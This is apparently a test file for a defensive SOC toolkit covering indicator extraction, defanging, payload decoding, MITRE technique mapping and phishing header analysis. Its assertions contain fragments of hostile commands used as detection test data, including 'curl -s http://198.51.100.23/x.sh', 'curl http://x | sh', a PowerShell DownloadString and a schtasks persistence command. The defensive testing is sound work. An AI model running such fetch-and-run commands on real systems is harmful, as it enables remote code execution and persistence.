import { test } from "node:test";
import assert from "node:assert/strict";
import { extractIocs, defangText, refang, shannonEntropy, domainEntropy } from "../src/lib/ioc.js";
import { autoUnwrap, encode } from "../src/lib/decode.js";
import { scanMitre, segmentText } from "../src/lib/mitre.js";
import { analyzeHeaders } from "../src/lib/headers.js";
import { PHISHING_INCIDENT, C2_BEACON_LOG, PAYLOADS, SPOOFED_EMAIL, LEGIT_EMAIL } from "../src/lib/samples.js";
import { buildEscalation } from "../src/lib/report.js";

const byType = (iocs, t) => iocs.filter((i) => i.type === t).map((i) => i.value);

test("refang handles common notations", () => {
  assert.equal(refang("hxxps[://]evil[.]com"), "https://evil.com");
  assert.equal(refang("user[at]evil(dot)com"), "user@evil.com");
  assert.equal(refang("10[.]0[.]0[.]1"), "10.0.0.1");
});

test("phishing sample extraction", () => {
  const iocs = extractIocs(PHISHING_INCIDENT);
  assert.deepEqual(byType(iocs, "sha256"), ["275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"]);
  assert.deepEqual(byType(iocs, "sha1"), ["3395856ce81f2b7382dee72602f798b642f14140"]);
  assert.deepEqual(byType(iocs, "md5"), ["44d88612fea8a8f36de82e1278abb02f"]);
  assert.ok(byType(iocs, "url").includes("https://northwind-hr-portal.com/login/update.php?uid=4821"));
  assert.ok(byType(iocs, "email").includes("payroll-notice@northwind-hr-portal.com"));
  const priv = iocs.find((i) => i.value === "10.20.4.17");
  assert.equal(priv.label, "PRIVATE RFC1918");
  assert.ok(!byType(iocs, "domain").some((d) => d.endsWith(".exe") || d.endsWith(".pdf") || d.endsWith(".php")));
  const dga = iocs.find((i) => i.value === "qx7v2kfj9plm3tzr8w.top");
  assert.ok(dga.flag, "DGA-like domain should be flagged");
  const benign = iocs.find((i) => i.value === "northwind-hr-portal.com");
  assert.equal(benign.flag, null, `entropy ${benign.entropy}`);
});

test("C2 log extraction and entropy", () => {
  const iocs = extractIocs(C2_BEACON_LOG);
  assert.equal(iocs.find((i) => i.value === "203.0.113.45").scope, "external");
  assert.equal(iocs.find((i) => i.value === "192.168.10.5").scope, "private");
  assert.ok(iocs.find((i) => i.value === "a9f3kz7qw2xv8mt4lp6rbn.xyz").flag);
  assert.equal(iocs.find((i) => i.value === "cdn-telemetry-sync.net").flag, null);
  assert.ok(shannonEntropy("aaaa") === 0);
  assert.ok(domainEntropy("google.com") < 3);
});

test("defangText neutralises indicators", () => {
  const t = defangText("see https://evil.com/a.php and 8.8.8.8 or bob@evil.com");
  assert.equal(t, "see hxxps://evil[.]com/a[.]php and 8[.]8[.]8[.]8 or bob[@]evil[.]com");
});

test("auto-unwrap peels every payload", () => {
  const [ps, url, js] = PAYLOADS.map((p) => autoUnwrap(p.value));
  const last = (s) => s[s.length - 1].text;
  assert.ok(last(ps).includes("DownloadString"), last(ps));
  assert.deepEqual(ps.map((s) => s.method), ["Input", "Base64", "Hex", "Base64 (embedded)"]);
  assert.ok(last(url).includes("curl -s http://198.51.100.23/x.sh"), last(url));
  assert.ok(last(js).includes("schtasks /create"), last(js));
  assert.equal(autoUnwrap("just plain text").length, 1);
  assert.equal(autoUnwrap("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f").length, 1, "hashes are not decoded");
  assert.equal(autoUnwrap(encode.base64Utf8("héllo wörld ✓")).at(-1).text, "héllo wörld ✓");
});

test("MITRE scanner maps techniques", () => {
  const stages = autoUnwrap(PAYLOADS[0].value);
  const all = stages.map((s) => s.text).join("\n");
  const ids = scanMitre(all).map((h) => h.id);
  for (const id of ["T1059.001", "T1027", "T1105", "T1547.001", "T1564.003", "T1033"]) assert.ok(ids.includes(id), id);
  const text = "curl http://x | sh";
  const segs = segmentText(text, scanMitre(text));
  assert.equal(segs.map((s) => s.text).join(""), text);
});

test("spoofed email analysis", () => {
  const a = analyzeHeaders(SPOOFED_EMAIL);
  assert.equal(a.auth.spf.status, "fail");
  assert.equal(a.auth.dkim.status, "none");
  assert.equal(a.auth.dmarc.status, "fail");
  assert.equal(a.hops.length, 4);
  assert.equal(a.hops[0].ip, "10.0.0.14");
  assert.equal(a.hops[1].ip, "203.0.113.88");
  assert.equal(a.hops[1].delay, 226); // 21:58:03Z → 22:01:49Z
  assert.equal(a.hops[3].ip, null, "hop with no from-clause has no relay IP");
  const titles = a.alignment.findings.map((f) => f.title);
  assert.ok(titles.includes("Return-Path domain differs from From"));
  assert.ok(titles.includes("Reply-To points to a different domain"));
  assert.ok(titles.includes("Display name contains a different address"));
});

test("legit email passes", () => {
  const a = analyzeHeaders(LEGIT_EMAIL);
  assert.deepEqual([a.auth.spf.status, a.auth.dkim.status, a.auth.dmarc.status], ["pass", "pass", "pass"]);
  assert.equal(a.alignment.findings.length, 0);
  assert.equal(a.hops[1].delay, 2);
});

test("escalation note", () => {
  const { markdown, json, priority } = buildEscalation(extractIocs(PHISHING_INCIDENT), { analystNotes: "User clicked link." });
  assert.equal(priority.level, "High");
  assert.ok(markdown.includes("`hxxps://northwind-hr-portal[.]com/login/update[.]php?uid=4821`"));
  assert.ok(!markdown.includes("https://northwind"), "no live URLs in note");
  assert.equal(JSON.parse(json).analyst_notes, "User clicked link.");
});
